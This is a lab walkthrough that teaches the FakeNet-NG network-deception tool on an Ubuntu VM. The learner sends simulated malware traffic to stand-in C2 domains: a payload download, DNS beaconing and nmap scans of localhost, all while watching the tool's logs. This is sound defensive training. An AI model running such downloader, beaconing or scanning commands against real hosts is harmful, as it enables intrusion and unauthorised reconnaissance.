![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)


# For the Ubuntu VM

# FakeNet-NG

### In this lab we will
- Run **FakeNet-NG** on Linux
- See how it intercepts and emulates network services
- Simulate “malware-like” traffic from the same host
- Inspect logs / captures to understand what happened

---

## Start FakeNet-NG (the fake Internet)

- Open up a **terminal** and run

```bash
cd ~/Desktop/fakenet-ng
```

```bash
source venv/bin/activate
```

```bash
sudo fakenet -c lab.ini
```

You should see something like:

- A banner
- The path to the configuration file (e.g. `default.ini`)
- Log messages about listeners starting (DNS, HTTP, SSL, etc.)

<img width="835" height="422" alt="image" src="https://github.com/user-attachments/assets/e35ab7f9-4fbf-4d0a-adae-9da28fcc8b7b" />


FakeNet-NG will **keep running in the foreground**.  
Leave this terminal window open. This is your **“Deception / Analyst” view**.

---

## See what FakeNet-NG is listening on

Open a **second terminal**.

### 3.1 List listening ports

```bash
sudo netstat -tulnp | grep -i fakenet
```

If `netstat` is missing, use:

```bash
sudo ss -tulnp | grep -i fakenet
```

You should see FakeNet-NG listening on multiple ports, for example:
- 53 (DNS)
- 80 (HTTP)
- 443 (HTTPS/SSL)
- 21 (FTP)
- 25 (SMTP)
- Others depending on your version/config

> This is the **deception**: FakeNet-NG pretends to be many services at once,
> so “malware” thinks it is talking to the real Internet.

---

## 4. Simulate simple web “malware” traffic

FakeNet-NG is still running in **terminal 1**.  
In **terminal 2**, we’ll play the role of the “malware” sending traffic.

### 4.1 HTTP request to a domain

```bash
curl http://totally-not-evil-c2.com/
```

Watch **terminal 1** (FakeNet-NG window):

- You should see a DNS query for `totally-not-evil-c2.com`
- Then an HTTP request logged by FakeNet-NG
- FakeNet-NG will return some default HTML content

In **terminal 2**, you’ll see that HTML response from FakeNet-NG, not the real Internet.

### 4.2 HTTPS request (FakeNet as fake TLS server)

```bash
curl https://really-bad-c2.example/ -k
```

- The `-k` flag tells `curl` to ignore certificate issues.
- FakeNet-NG pretends to be the HTTPS server and answers the request.

Again, watch **terminal 1** to see the intercepted traffic and listener output.

---

## 5. Simulate a “malware” downloader

Many samples download payloads like `evil.exe` from some HTTP server.  
Let’s simulate that with `curl`.

Still in **terminal 2**:

```bash
curl -o payload.exe http://malicious-update.evil/payload.exe
```

- FakeNet-NG sees a request for a `.exe` file
- It responds with a **default fake PE file** from its `defaultFiles` directory
- To the “malware”, this looks like a real executable download succeeded

Check what we downloaded:

```bash
file payload.exe
ls -lh payload.exe
```

You should see that `payload.exe` is a valid file (often a small PE) even though
it came from your **fake** network.

> This is classic **deception**: the attacker / malware thinks the download worked
> and continues execution, while you safely observe everything.

---

## 6. Simulate DNS beaconing

Let’s imitate beaconing behavior where malware repeatedly talks to random domains.

First install DNS tools if needed:

```bash
sudo apt install -y dnsutils
```

Now run:

```bash
for i in {1..5}; do
  dig +short c2$i.super-evil-botnet.com
  sleep 1
done
```

Watch **terminal 1**:

- You should see multiple DNS queries for the fake `c2*.super-evil-botnet.com` domains
- FakeNet-NG will respond with fake IP addresses

> In a real analysis, these logs help you extract **network IOCs**
> (domains, IPs, URIs) from malware safely.

---

## 7. Simulate a port-scanning “malware”

Now we’ll pretend the malware is scanning common service ports.

### 7.1 Install nmap (if not installed)

```bash
sudo apt install -y nmap
```

### 7.2 Scan common ports on localhost

```bash
nmap -Pn -p 21,25,53,80,110,443,445 127.0.0.1
```

- From **nmap’s perspective** (attacker view), it will look like these ports are open
  and responding on `127.0.0.1`.
- In **terminal 1** (FakeNet-NG), you’ll see many connection attempts logged
  against the emulated services.

You can push it further with a more aggressive scan (optional, but noisy):

```bash
nmap -sS -p- 127.0.0.1
```

FakeNet-NG will try to keep up and emulate responses, again acting as a fake,
but convincing, network.

---

## 8. Look at captures / logs

Stop FakeNet-NG by going to **terminal 1** and pressing:

```text
Ctrl + C
```

Depending on version/config, FakeNet-NG may:

- Save a **PCAP** file with captured traffic
- Or create a `fakenet_logs` directory with logs and captures

In the directory where you started FakeNet-NG, run:

```bash
ls
```

Look for files such as:

- `*.pcap`
- `fakenet_logs/`
- Or similar log filenames

If you see a `.pcap` file, you can open it with Wireshark later for deeper analysis:

```bash
wireshark captured_traffic.pcap
```

(You don’t need Wireshark for this lab, but it’s a nice extension.)

---

## 9. Quick recap (what this lab demonstrated)

In this lab you:

- Installed **FakeNet-NG** on Linux
- Observed how it:
  - Took over multiple ports (DNS, HTTP, HTTPS, FTP, SMTP, etc.)
  - Answered requests with **fake but valid** responses
- Simulated “malware-like” behavior:
  - Reaching out to fake C2 domains
  - Downloading a fake payload executable
  - Beaconing via DNS
  - Scanning ports on localhost
- Saw both perspectives:
  - **Attacker / Malware view** (commands you ran)
  - **Defender / Analyst view** (FakeNet-NG logs and captures)

This is a simple but concrete example of **network deception** in action:
FakeNet-NG tricks untrusted software into talking to your controlled fake
services, letting you safely observe everything it tries to do.








***                                                                 
<b><i>Continuing the course? </br>[Next Lab](/IntroClassFiles/Tools/IntroClass/ADHD/canarytokens/Canarytokens.md)</i></b>

<b><i>Want to go back? </br>[Previous Lab](/IntroClassFiles/Tools/IntroClass/ADHD/DNSChef.md)</i></b>

<b><i>Looking for a different lab? </br>[Lab Directory](/IntroClassFiles/navigation.md)</i></b>

***Finished with the Labs?***

Please be sure to destroy the lab environment!

[Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)

---
